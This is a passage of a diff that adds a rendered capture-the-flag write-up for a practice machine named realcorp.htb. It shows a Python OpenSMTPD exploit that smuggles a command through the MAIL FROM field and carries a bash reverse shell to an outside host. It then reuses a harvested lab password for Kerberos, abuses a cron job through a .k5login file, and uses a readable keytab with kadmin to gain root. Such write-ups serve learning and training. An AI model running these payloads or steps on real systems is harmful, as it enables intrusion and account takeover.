+</span><span class="n">s</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="c1"><mark>#writeto = input("Which file do you want to write to?: ")#raw inputen</mark>
+<mark>#writewhat = input("What do you want to write to the file?: ")</mark>
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">"""</span><span class="se">\r\n</span><span class="s">
+#0</span><span class="se">\r\n</span><span class="s">
+#1</span><span class="se">\r\n</span><span class="s">
+#2</span><span class="se">\r\n</span><span class="s">
+#3</span><span class="se">\r\n</span><span class="s">
+#4</span><span class="se">\r\n</span><span class="s">
+#5</span><span class="se">\r\n</span><span class="s">
+#6</span><span class="se">\r\n</span><span class="s">
+#7</span><span class="se">\r\n</span><span class="s">
+#8</span><span class="se">\r\n</span><span class="s">
+#9</span><span class="se">\r\n</span><span class="s">
+#a</span><span class="se">\r\n</span><span class="s">
+#b</span><span class="se">\r\n</span><span class="s">
+#c</span><span class="se">\r\n</span><span class="s">
+#d</span><span class="se">\r\n</span><span class="s">
+<mark>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/443 0&gt;&amp;1'</mark>
+.
+"""</span>
+<span class="k">for</span> <span class="n">res</span> <span class="ow">in</span> <span class="n">socket</span><span class="o">.</span><span class="n">getaddrinfo</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">AF_UNSPEC</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">):</span>
+    <span class="n">af</span><span class="p">,</span> <span class="n">socktype</span><span class="p">,</span> <span class="n">proto</span><span class="p">,</span> <span class="n">canonname</span><span class="p">,</span> <span class="n">sa</span> <span class="o">=</span> <span class="n">res</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">af</span><span class="p">,</span> <span class="n">socktype</span><span class="p">,</span> <span class="n">proto</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">OSError</span> <span class="k">as</span> <span class="n">msg</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="k">continue</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">sa</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">OSError</span> <span class="k">as</span> <span class="n">msg</span><span class="p">:</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="k">continue</span>
+    <span class="k">break</span>
+<span class="k">if</span> <span class="n">s</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'could not open socket'</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">with</span> <span class="n">s</span><span class="p">:</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">'Received'</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">'sending'</span><span class="p">)</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="s">"helo test.com</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">'Received'</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="s">"MAIL FROM:&lt;;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;&gt;</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">'Received'</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+	<span class="c1"><mark>s.send(b"RCPT TO:&lt;j.nakazawa@realcorp.htb&gt;\r\n")</mark>
+</span>	<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">'Received'</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="s">"DATA</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">'Received'</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">'Received'</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="s">"QUIT</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">'Received'</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"done"</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>And upon running the exploit:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>proxychains python3 exploit.py
+
+  Received b<span class="s1">'220 smtp.realcorp.htb ESMTP OpenSMTPD\r\n'</span>
+  sending
+  Received b<span class="s1">'250 smtp.realcorp.htb Hello test.com [10.241.251.1], pleased to meet you\r\n'</span>
+  Received b<span class="s1">'250 2.0.0 Ok\r\n'</span>
+  Received b<span class="s1">'250 2.1.5 Destination address valid: Recipient ok\r\n'</span>
+  Received b<span class="s1">'354 Enter mail, end with "." on a line by itself\r\n'</span>
+  Received b<span class="s1">'250 2.0.0 da629965 Message accepted for delivery\r\n'</span>
+  Received b<span class="s1">'221 2.0.0 Bye\r\n'</span>
+  <span class="k">done</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>A reverse shell started via <strong>netcat</strong> listener on port 443 was spawned:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvp</span> 443
+
+root@smtp:~# <span class="nb">id
+
+  </span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+
+root@smtp:~# <span class="nb">hostname
+
+  </span>smtp.realcorp.htb</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-5-generating-user-shell-j-nakazawa">PART 5 : GENERATING USER SHELL (j.nakazawa)</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Enumerating inside the reverse shell established from <code><strong>10.241.251.113</strong></code>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">root@smtp:/# <span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"sh$"</span>
+
+  root:x:0:0:root:/root:/bin/bash
+  j.nakazawa:x:1000:1000::/home/j.nakazawa:/bin/bash
+
+root@smtp:/# <span class="nb">cd</span> /home/j.nakazawa
+
+root@smtp:/home/j.nakazawa# <span class="nb">ls</span> <span class="nt">-la</span>
+
+  total 16
+  drwxr-xr-x. 1 j.nakazawa j.nakazawa   59 Apr  6 06:18 <span class="nb">.</span>
+  drwxr-xr-x. 1 root       root         24 Dec  8 10:56 ..
+  lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .bash_history -&gt; /dev/null
+  <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 j.nakazawa j.nakazawa  220 Apr 18  2019 .bash_logout
+  <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 j.nakazawa j.nakazawa 3526 Apr 18  2019 .bashrc
+  <span class="c"><mark>-rw-------. 1 j.nakazawa j.nakazawa  476 Dec  8 19:12 .msmtprc</mark></span>
+  <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 j.nakazawa j.nakazawa  807 Apr 18  2019 .profile
+  lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .viminfo -&gt; /dev/null
+
+root@smtp:/home/j.nakazawa# <span class="nb">cat</span> .msmtprc
+
+  <span class="c"># Set default values for all following accounts.</span>
+  defaults
+  auth           on
+  tls            on
+  tls_trust_file /etc/ssl/certs/ca-certificates.crt
+  logfile        /dev/null
+
+  <span class="c"># RealCorp Mail</span>
+  account        realcorp
+  host           127.0.0.1
+  port           587
+  from           j.nakazawa@realcorp.htb
+  <span class="c"><mark>user           j.nakazawa</mark></span>
+  <span class="c"><mark>password       sJB}RM&gt;6Z~64_</mark></span>
+  tls_fingerprint	C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60
+
+  <span class="c"># Set a default account</span>
+  account default : realcorp</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Using the credentials found (<code><strong>j.nakazawa:sJB}RM&gt;6Z~64_</strong></code>) to SSH into <strong>10.10.10.224</strong> fails; however earlier, kerberos is enabled and to generate a <strong>krbtgt</strong> ticket, a password is needed:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>kinit <span class="nt">-V</span> j.nakazawa
+
+  Using default cache: /tmp/krb5cc_1000
+  Using principal: j.nakazawa@REALCORP.HTB
+  Password <span class="k">for </span>j.nakazawa@REALCORP.HTB: sJB<span class="o">}</span>RM&gt;6Z~64_
+  Authenticated to Kerberos v5
+
+<span class="nv">$ </span>klist
+
+  Ticket cache: FILE:/tmp/krb5cc_1000
+  Default principal: j.nakazawa@REALCORP.HTB
+
+  Valid starting       Expires              Service principal
+  xx/xx/xxxx xx:xx:xx  xx/xx/xxxx xx:xx:xx  krbtgt/REALCORP.HTB@REALCORP.HTB</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The authentication via <strong>kerberos</strong> succeeded and a ticket valid for 24 hours was generated. Using this to login via SSH, the <code><strong>/etc/hosts</strong></code> needs to be modified to give priority to <code><strong>srv01.realcorp.htb</strong></code>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="gp"><mark></span><span class="c">#10.10.10.224    srv01.realcorp.htb realcorp.htb</mark>#</span>
+<span class="go">10.197.243.31   wpad.realcorp.htb</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>ssh <span class="nt">-l</span> j.nakazawa 10.10.10.224
+
+<span class="o">[</span>j.nakazawa@srv01 ~]<span class="nv">$ </span><span class="nb">id
+
+  </span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>j.nakazawa<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>j.nakazawa<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>j.nakazawa<span class="o">)</span>,23<span class="o">(</span>squid<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+<span class="o">[</span>j.nakazawa@srv01 ~]<span class="nv">$ </span><span class="nb">hostname
+
+  </span>srv01.realcorp.htb
+
+<span class="o">[</span>j.nakazawa@srv01 ~]<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> user.txt
+
+  <span class="nt">-r--------</span><span class="nb">.</span> 1 j.nakazawa j.nakazawa 33 Apr  6 19:52 user.txt</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The reason for this becomes apparent when <code><strong>klist</strong></code> is run again on the local machine:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>klist
+
+  Ticket cache: FILE:/tmp/krb5cc_1000
+  Default principal: j.nakazawa@REALCORP.HTB
+
+  Valid starting       Expires              Service principal
+  xx/xx/xxxx xx:xx:xx  xx/xx/xxxx xx:xx:xx  krbtgt/REALCORP.HTB@REALCORP.HTB
+  xx/xx/xxxx xx:xx:xx  xx/xx/xxxx xx:xx:xx  host/srv01.realcorp.htb@
+  	Ticket server: host/srv01.realcorp.htb@REALCORP.HTB</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The machine was using <code><strong>srv01.realcorp.htb</strong></code> for kerberos authentication and a ticket for the host was acuired during the connection.</p>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-6-changing-user-j-nakazawa-admin">PART 6 : CHANGING USER (j.nakazawa &#8594; admin)</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Enumerating inside the machine as <code><strong>j.nakazawa</strong></code>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="o">[</span>j.nakazawa@srv01 ~]<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"sh$"</span>
+
+  root:x:0:0:root:/root:/bin/bash
+  j.nakazawa:x:1000:1000::/home/j.nakazawa:/bin/bash
+  admin:x:1011:1011::/home/admin:/bin/bash
+
+<span class="o">[</span>j.nakazawa@srv01 ~]<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="nt">-E</span> <span class="s2">"root|admin"</span> /etc/cron<span class="k"><strong></span>
+
+  /etc/cron.d/0hourly:MAILTO<span class="o">=</span>root
+  /etc/cron.d/0hourly:01 <span class="k"></strong></span> <span class="k"><strong></span> <span class="k"></strong></span> <span class="k"><strong></span> root run-parts /etc/cron.hourly
+  /etc/cron.d/raid-check:0 1 <span class="k"></strong></span> <span class="k"><strong></span> Sun root /usr/sbin/raid-check
+  /etc/crontab:MAILTO<span class="o">=</span>root
+  /etc/crontab:<mark><span class="k"></strong></span> <span class="k"><strong></span> <span class="k"></strong></span> <span class="k"><strong></span> <span class="k"></strong></span> admin /usr/local/bin/log_backup.sh</mark></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>After looking for other users in the machine, system cronjobs were checked and one was created by the user, <code><strong>admin</strong></code>&#8201;&#8212;&#8201;<code><strong>/usr/local/bin/log_backup.sh</strong></code>. Upon checking the contents:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="sh"><span class="c">#!/bin/bash</span>
+
+/usr/bin/rsync <span class="nt">-avz</span> <span class="nt">--no-perms</span> <span class="nt">--no-owner</span> <span class="nt">--no-group</span> /var/log/squid/ /home/admin/
+<span class="nb">cd</span> /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.<span class="sb"><code></span>/usr/bin/date +%F-%H%M%S<span class="sb"></code></span> access.log cache.log
+/usr/bin/rm <span class="nt">-f</span> access.log cache.log</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>This will archive/compress the contents of <code><strong>/var/log/squid/</strong></code> and copy it to <code><strong>/home/admin/</strong></code>. It will then compress log files and save it before deleting them.</p>
+</div>
+<div class="paragraph">
+<p>Now, leveraging the <code><strong>rsync</strong></code> being run in the cronjob, we need to search if the directories involved are writable:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="o">[</span>j.nakazawa@srv01 ~]<span class="nv">$ </span><span class="nb">id
+
+  </span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>j.nakazawa<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>j.nakazawa<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>j.nakazawa<span class="o">)</span>,<mark>23<span class="o">(</span>squid<span class="o">)</span><span class="c"></mark>,100(users)</span>
+  <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+<span class="o">[</span>j.nakazawa@srv01 log]<span class="nv">$ </span>find / <span class="nt">-gid</span> 23 <span class="c"><mark>-writable</mark> 2&gt;/dev/null</span>
+
+  <span class="c"><mark>/var/log/squid</mark></span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Since, the current user is a member of the <code><strong>squid</strong></code> group (23), the directory <code>/var/log/squid/</code> should be writable.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="o">[</span>j.nakazawa@srv01 log]<span class="nv">$ </span><span class="nb">echo </span>j.nakazawa@REALCORP.HTB <span class="o">&gt;</span> /var/log/squid/.k5login</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The reason for writing a <code><strong>.k5login</strong></code> file which will then be copied into the <code><strong>/home/admin/</strong></code> directory is that if you want other users to be able to login to your account using kerberos, you need to add their principal name (in this case, <code><strong>j.nakazawa@REALCORP.HTB</strong></code>) into a <code><strong>.k5login</strong></code> in your home directory (<code><strong>~/.k5login</strong></code>). With this, we should now be able to login with the user, <code><strong>admin</strong></code>, once the cronjob finishes execution.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>ssh <span class="nt">-l</span> admin 10.10.10.224
+
+<span class="o">[</span>admin@srv01 ~]<span class="nv">$ </span><span class="nb">id
+
+  </span><span class="nv">uid</span><span class="o">=</span>1011<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1011<span class="o">(</span>admin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1011<span class="o">(</span>admin<span class="o">)</span>,23<span class="o">(</span>squid<span class="o">)</span>
+  <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+<span class="o">[</span>admin@srv01 ~]<span class="nv">$ </span><span class="nb">hostname
+
+  </span>srv01.realcorp.htb</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-7-privilege-escalation-admin-root">PART 7 : PRIVILEGE ESCALATION (admin &#8594; root)</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Enumerating inside the machine as <code><strong>admin</strong></code>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="o">[</span>admin@srv01 ~]<span class="nv">$ </span><span class="nb">id</span>
+
+  <span class="c"><mark>uid=1011(admin)</mark> gid=1011(admin) groups=1011(admin),23(squid)</span>
+  <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+<span class="o">[</span>admin@srv01 ~]<span class="nv">$ </span>find / <span class="nt">-gid</span> 1011 <span class="c"><mark>-readable</mark> 2&gt;/dev/null | grep -vE "<sup>.proc|</sup>.run|^.sys"</span>
+
+  <span class="c"><mark>/etc/krb5.keytab</mark></span>
+  /usr/local/bin/log_backup.sh
+  /home/admin
+  /home/admin/.ssh
+
+<span class="o">[</span>admin@srv01 ~]<span class="nv">$ </span>file /etc/krb5.keytab
+
+  /etc/krb5.keytab: Kerberos Keytab file, <span class="nv">realm</span><span class="o">=</span>REALCORP.HTB, <span class="nv">principal</span><span class="o">=</span>host/srv01.realcorp.htb, <span class="nb">type</span><span class="o">=</span>1, <span class="nb">date</span><span class="o">=</span>Tue Dec  8 22:15:30 2020, <span class="nv">kvno</span><span class="o">=</span>2</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Searching for all readable files by the user, <code><strong>admin</strong></code>, returns a readable keytab file&#8201;&#8212;&#8201;<code><strong>/etc/krb5.keytab</strong></code>. It is where service principal keys are stored and improper permissions or having read access to the file enables an attacker to impersonate service accounts.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="o">[</span>admin@srv01 ~]<span class="nv">$ </span>klist <span class="nt">-k</span> /etc/krb5.keytab
+
+  Keytab name: FILE:/etc/krb5.keytab
+  KVNO Principal
+  <span class="nt">----</span> <span class="nt">--------------------------------------------------------------------------</span>
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Viewing the contents of the keytab file, there two accounts that could be impersonated using <code><strong>kadmin</strong></code>-- <code>kadmin/changepw@REALCORP.HTB</code> and <code><strong>kadmin/admin@REALCORP.HTB</strong></code></p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="o">[</span>admin@srv01 ~]<span class="nv">$ </span>kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> kadmin/admin@REALCORP.HTB
+
+kadmin: get_privs
+
+  current privileges: INQUIRE <span class="c"><mark>ADD</mark> MODIFY DELETE</span>
+
+kadmin: add_principal root@REALCORP.HTB
+
+  No policy specified <span class="k">for </span>root@REALCORP.HTB<span class="p">;</span> defaulting to no policy
+  Enter password <span class="k">for </span>principal <span class="s2">"root@REALCORP.HTB"</span>: ggwp
+  Re-enter password <span class="k">for </span>principal <span class="s2">"root@REALCORP.HTB"</span>: ggwp
+  Principal <span class="s2">"root@REALCORP.HTB"</span> created.
+
+kadmin: <span class="nb">exit</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>It seems like the <code><strong>admin</strong></code> account has <code><strong>ADD</strong></code> privileges to <strong>Kerberos</strong> and with that, a user principal, <code><strong>root@REALCORP.HTB</strong></code>, was successfully created. Now, to gain root access:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="o">[</span>admin@srv01 ~]<span class="nv">$ </span>ksu
+
+  WARNING: Your password may be exposed <span class="k">if </span>you enter it here and are logged
+           <span class="k">in </span>remotely using an unsecure <span class="o">(</span>non-encrypted<span class="o">)</span> channel.
+  Kerberos password <span class="k">for </span>root@REALCORP.HTB: : ggwp
+
+<span class="o">[</span>root@srv01 admin]# <span class="nb">id
+
+  </span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+  <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c102
+
+<span class="o">[</span>root@srv01 admin]# <span class="nb">ls</span> <span class="nt">-l</span> /root/root.txt
+
+  <span class="nt">-r--------</span><span class="nb">.</span> 1 root root 33 Apr  7 00:04 /root/root.txt
+
+<span class="o">[</span>root@srv01 admin]# ip addr
+
+  1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+      <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+      inet 127.0.0.1/8 scope host lo
+         valid_lft forever preferred_lft forever
+      inet6 ::1/128 scope host
+         valid_lft forever preferred_lft forever
+  2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+      <span class="nb">link</span>/ether 00:50:56:b9:d3:48 brd ff:ff:ff:ff:ff:ff
+      inet 10.10.10.224/24 brd 10.10.10.255 scope global noprefixroute ens192
+         valid_lft forever preferred_lft forever
+      inet 10.197.243.77/24 brd 10.197.243.255 scope global noprefixroute ens192:0
+         valid_lft forever preferred_lft forever
+      inet 10.197.243.31/24 brd 10.197.243.255 scope global secondary noprefixroute ens192:1
+         valid_lft forever preferred_lft forever
+      inet6 dead:beef::4627:8a70:2d81:989f/64 scope global dynamic noprefixroute
+         valid_lft 86368sec preferred_lft 14368sec
+      inet6 fe80::6588:7412:db10:612c/64 scope <span class="nb">link </span>noprefixroute
+         valid_lft forever preferred_lft forever
+  3: cni-podman1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
+      <span class="nb">link</span>/ether 0e:7e:1c:08:ed:d2 brd ff:ff:ff:ff:ff:ff
+      inet 10.241.251.1/24 brd 10.241.251.255 scope global cni-podman1
+         valid_lft forever preferred_lft forever
+      inet6 fe80::c7e:1cff:fe08:edd2/64 scope <span class="nb">link
+         </span>valid_lft forever preferred_lft forever
+  4: vethbc94cb18@if3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master cni-podman1 state UP group default
+      <span class="nb">link</span>/ether 82:ca:1b:ae:e7:18 brd ff:ff:ff:ff:ff:ff link-netns cni-4a7ef39c-a97e-11a6-433c-4dd8d53bd27b
+      inet6 fe80::80ca:1bff:feae:e718/64 scope <span class="nb">link
+         </span>valid_lft forever preferred_lft forever</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-8-references">PART 8 : REFERENCES</h2>
+<div class="sectionbody">
+<div class="ulist">
+<ul>
+<li>
+<p><a href="https://nakedsecurity.sophos.com/2016/05/25/when-domain-names-attack-the-wpad-name-collision-vulnerability/" class="bare">https://nakedsecurity.sophos.com/2016/05/25/when-domain-names-attack-the-wpad-name-collision-vulnerability/</a></p>
+</li>
+<li>
+<p><a href="https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/" class="bare">https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/</a></p>
+</li>
+<li>
+<p><a href="https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch04s14.html" class="bare">https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch04s14.html</a></p>
+</li>
+<li>
+<p><a href="https://directory.apache.org/apacheds/kerberos-ug/4.1-authenticate-kinit.html" class="bare">https://directory.apache.org/apacheds/kerberos-ug/4.1-authenticate-kinit.html</a></p>
+</li>
+<li>
